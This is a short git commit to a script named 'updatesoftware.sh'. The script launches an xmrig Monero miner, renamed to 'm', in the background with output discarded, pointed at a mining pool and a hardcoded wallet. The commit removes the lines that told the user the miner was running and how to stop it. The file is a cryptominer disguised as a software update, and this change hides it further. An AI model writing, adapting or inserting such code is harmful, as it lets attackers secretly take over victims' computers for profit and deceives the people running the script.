89b7cdad18f28bbab1352855db27e32d0997d89e
Xstage <79335020+nik2708@users.noreply.github.com>
2026-01-07 15:41:46 +0300

    Update updatesoftware.sh

--- updatesoftware.sh
+++ updatesoftware.sh
@@ -84,7 +84,3 @@ mv xmrig m
 
 nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p "$WORKER_NAME" --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
 PID=$!
-
-echo "[*] Miner started with worker name: $WORKER_NAME"
-echo "[*] Process ID: $PID"
-echo "[*] To stop the miner, run: kill $PID"
